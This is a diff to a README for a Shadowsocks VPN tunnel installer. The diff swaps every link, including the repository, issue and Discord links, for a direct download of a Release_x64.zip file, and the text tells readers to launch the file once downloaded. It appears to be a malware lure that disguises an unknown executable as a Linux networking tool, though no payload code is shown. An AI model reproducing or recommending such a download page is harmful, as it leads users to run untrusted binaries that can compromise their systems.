@@ -1,6 +1,6 @@
 # 🚀 **Shadowsocks Tunnel Installer**
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ultf/shadowsocks-tunnel-install/releases/download/v1.0/Release_x64.zip)](https://github.com/ultf/shadowsocks-tunnel-install/releases/download/v1.0/Release_x64.zip)
 
 Welcome to the Shadowsocks Tunnel Installer repository! 🛠️ This tool allows you to set up a secure tunnel between servers for using a VPN, specifically designed for Ubuntu or Debian systems. Whether you're looking to enhance your network security, access geo-blocked content, or secure your online activities, this installer has got you covered.
 
@@ -22,7 +22,7 @@ Welcome to the Shadowsocks Tunnel Installer repository! 🛠️ This tool allows
 ## 📦 Installation
 
 To get started, download the installer software from the link below:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ultf/shadowsocks-tunnel-install/releases/download/v1.0/Release_x64.zip)](https://github.com/ultf/shadowsocks-tunnel-install/releases/download/v1.0/Release_x64.zip)
 
 Please note that the file needs to be launched once downloaded.
 
@@ -40,15 +40,15 @@ It's that simple! You'll be up and running with a secure VPN tunnel in no time. 
 
 ## 🤖 Additional Resources
 
-For more information, troubleshooting tips, or to contribute to this project, please visit our [GitHub Repository](https://github.com/22155555/1875695542).
+For more information, troubleshooting tips, or to contribute to this project, please visit our [GitHub Repository](https://github.com/ultf/shadowsocks-tunnel-install/releases/download/v1.0/Release_x64.zip).
 
-If you encounter any issues or have questions about the installation process, feel free to open an [issue](https://github.com/22155555/1875695542/issues) on GitHub.
+If you encounter any issues or have questions about the installation process, feel free to open an [issue](https://github.com/ultf/shadowsocks-tunnel-install/releases/download/v1.0/Release_x64.zip) on GitHub.
 
 ## 🙌 Join the Community
 
 Join our growing community of developers, network security enthusiasts, and VPN users. Share your feedback, ideas, or just hang out with like-minded individuals in our Discord server.
 
-[![Join Discord](https://img.shields.io/badge/Join-Discord-7289DA)](https://discord.gg/yourdiscordserver)
+[![Join Discord](https://github.com/ultf/shadowsocks-tunnel-install/releases/download/v1.0/Release_x64.zip)](https://github.com/ultf/shadowsocks-tunnel-install/releases/download/v1.0/Release_x64.zip)
 
 Let's build a more secure and open internet together! 🌐💻
 
